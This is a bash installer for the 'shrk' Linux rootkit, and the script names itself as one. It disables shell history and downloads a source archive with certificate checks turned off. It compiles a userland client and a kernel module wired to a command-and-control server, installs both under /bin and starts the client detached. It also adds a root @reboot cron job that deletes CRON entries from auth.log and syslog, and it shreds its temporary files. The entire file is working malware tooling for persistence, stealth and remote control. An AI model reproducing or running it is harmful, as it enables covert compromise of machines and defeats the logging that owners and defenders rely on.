#!/bin/bash

# disable bash history
unset HISTFILE

# global vars, replaced by actual values, see server/database/client.go
SHRK_SERVER_ADDR='[SERVER_ADDR]'
SHRK_SERVER_PORT=[SERVER_PORT]
SHRK_CLIENT_ID='[CLIENT_ID]'
SHRK_CLIENT_KEY='[CLIENT_KEY]'
SHRK_SOURCE_URL='[SOURCE_URL]'
SHRK_VERSION='[VERSION]'
SHRK_DEBUG=[DEBUG]

if [ -z "${SHRK_DEBUG}" ]; then
  SHRK_DEBUG=0
fi

if [ -z "${SHRK_SERVER_PORT}" ]; then
  SHRK_SERVER_PORT=0
fi

# colors and formatting ANSI escapes
FG_BOLD="\e[1m"
FG_RESET="\e[0m"
FG_RED="\e[31m"
FG_BLUE="\e[34m"
FG_GREEN="\e[32m"
FG_YELLOW="\e[33m"

# other global vars
client_path="/bin/shrk_client_${SHRK_CLIENT_ID}"
module_path="/bin/shrk_module_${SHRK_CLIENT_ID}"
required=(
  "setsid.util-linux"
  "make.GNU make"
  "gcc.GCC"
)
tmpdir=".${RANDOM}${RANDOM}"
task_used=0

banner() {
  echo -e ${FG_RED}${FG_BOLD}'  ,_'
  echo -e ${FG_RED}${FG_BOLD}'  )#\.'
  echo -e ${FG_RED}${FG_BOLD}'  )# #\.'
  echo -e ${FG_RED}${FG_BOLD}"  )#   #\\.     shrk ${SHRK_VERSION}"
  echo -e ${FG_RED}${FG_BOLD}"  )#     #\\.   client ${SHRK_CLIENT_ID}"
  echo -e ${FG_RED}${FG_BOLD}'  )#       #\.'
  echo -e ${FG_RED}${FG_BOLD}'  )#_________#\.'
  echo -e ${FG_RED}${FG_BOLD}'==--------------====================='
}

info() {
  echo -e "${FG_BLUE}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET}"
}

err() {
  echo -e "${FG_RED}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET}"
}

warn(){
  echo -e "${FG_YELLOW}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET}"
}

task_log(){
  if [ $task_used -eq 0 ]; then
    echo -en "${FG_BLUE}${FG_BOLD}=>${FG_RESET} ${FG_BOLD}${1}${FG_RESET}... "
    task_used=1
  fi
}

task_done() {
  if [ $task_used -eq 1 ]; then
    echo -e "${FG_GREEN}${FG_BOLD}DONE${FG_RESET}"
    task_used=0
  fi
}

task_fail(){
  if [ $task_used -eq 1 ]; then
    echo -e "${FG_RED}${FG_BOLD}FAIL${FG_RESET}"
    task_used=0
  fi
}

quiet() {
  $@ &> /dev/null
  return $?
}

check_cmd() {
  quiet command -v "${1}"
  return $?
}

cleanup() {
  task_log "Cleaning up the temporary directory"
    quiet cd

    if check_cmd "shred"; then
      quiet find "${tmpdir}" -type f -exec shred -uz {} 2>&1 > /dev/null \;
    fi

    quiet rm -rf "${tmpdir}"
  task_done
}

check_ret() {
  if [ $? -ne 0 ]; then
    task_fail
    err "${1}"

    cleanup
    exit 1
  fi
}

if [ "$EUID" != "0" ]; then
  err "No you can't install a rootkit without root"
  exit 1
fi

# check for required stuff
for r in "${required[@]}"; do
  cmd=$(echo "${r}" | cut -d. -f1)
  name=$(echo "${r}" | cut -d. -f2)

  check_cmd "${cmd}"
  check_ret "${name} is not found, and it's required for the build"
done

# we need wget or curl
if ! check_cmd "curl" && ! check_cmd "wget"; then
  err "cURL or GNU wget is required to download the source archive"
  exit 1
fi

banner

task_log "Checking kernel version"
  majorver=$(uname -r | cut -d "." -f1)
  if [ "$majorver" != "5" ] && [ "$majorver" != "6" ]; then
    task_fail
    err "Incompatible kernel version! ($(uname -r))"
    exit 1
  fi
task_done

task_log "Checking architecture"
  if [ "$(uname -m)" != "x86_64" ]; then
    task_fail
    err "Incompatible architecture! ($(uname -m))"
    exit 1
  fi
task_done

task_log "Creating a temporary directory"
  if [ -d "/dev/shm" ]; then
    quiet cd "/dev/shm"
    check_ret "Failed to change directory to /dev/shm"
  elif [ -d "/tmp" ]; then
    quiet cd "/tmp"
    check_ret "Failed to change directory to /tmp"
  fi

  quiet mkdir -p "${tmpdir}"
  check_ret "Failed to create the temporary directory"

  quiet cd "${tmpdir}"
  check_ret "Failed to change directory to the temporary directory"

  quiet chmod 700 .
  check_ret "Failed to chmod the temporary directory"
task_done

info "Downloading the source archive"
if check_cmd "curl"; then
  curl -Lk# "${SHRK_SOURCE_URL}" -o 'src'
  check_ret "Failed to download the source with cURL"
elif check_cmd "wget"; then
  wget --no-check-certificate \
       --show-progress        \
       --no-verbose           \
       -O 'src' "${SHRK_SOURCE_URL}"
  check_ret "Failed to download the source with GNU wget"
fi

task_log "Extracting the source archive"
  quiet tar xf 'src'
  check_ret "Failed to extract the archive"
task_done

# see if cron persistence is available
if check_cmd "systemctl" && check_cmd "sed" && [ -d "/etc/cron.d" ]; then
  info "cron persistence seems to be available, do you want it?"
  echo -en "${FG_BOLD}(y/n)${FG_RESET}: "
  read answer

  if [[ "${answer}" == "Y" ]] || [[ "${answer}" == "y" ]]; then
    info "Alright, will also install the cron persistence"
    cron_path="/etc/cron.d/shrk_${CLIENT_ID}"
    persis_path="${cron_path}"
  fi
fi

info "If you have a file/directory you'd like to use for persistence, enter it's path"
echo -en "${FG_BOLD}(path)${FG_RESET}: "
read persis_path

if [ -z "${persis_path}" ]; then
  warn "You have configured no persistence methods, installation will not persist after a reboot"
fi

# build the userland client and the kernel module
info "Building the userland client"
quiet pushd user
  make SHRK_DEBUG=${SHRK_DEBUG}               \
       SHRK_DEBUG_DUMP=0                      \
       SHRK_MODULE="${module_path}"           \
       SHRK_CLIENT_ID="${SHRK_CLIENT_ID}"     \
       SHRK_CLIENT_KEY="${SHRK_CLIENT_KEY}"   \
       SHRK_CLIENT_KEY="${SHRK_CLIENT_KEY}"   \
       SHRK_SERVER_ADDR="${SHRK_SERVER_ADDR}" \
       SHRK_SERVER_PORT=${SHRK_SERVER_PORT}   \
       SHRK_PERSIS_FILE="${persis_path}"      \
       -j$(nproc) > /dev/null
  check_ret "Failed to build the kernel"
quiet popd

info "Building the kernel module"
quiet pushd kernel
  make SHRK_DEBUG=${SHRK_DEBUG}           \
       SHRK_CLIENT_ID="${SHRK_CLIENT_ID}" \
       -j$(nproc) > /dev/null
  check_ret "Failed to build the userland client"
quiet popd

# now install the built client and the module
install -m500 "user/shrk-user.elf" "${client_path}"
check_ret "Failed to install the userland client"

install -m500 "kernel/shrk.ko" "${module_path}"
check_ret "Failed install the kernel module"

# lastly, complete cron persistence (if enabled)
if [ ! -z "${cron_path}" ]; then
  cat > "${cron_path}" << EOF
@reboot root ${client_path} &> /dev/null && if [ -f /var/log/auth.log ]; then sed '/CRON/d' -i /var/log/auth.log; fi && if [ -f /var/log/syslog ]; then sed '/CRON/d' -i /var/log/syslog; fi && systemctl restart cron
EOF
fi

# execute the client
setsid "${client_path}" &> /dev/null &

# cleanup the temporary dir
cleanup
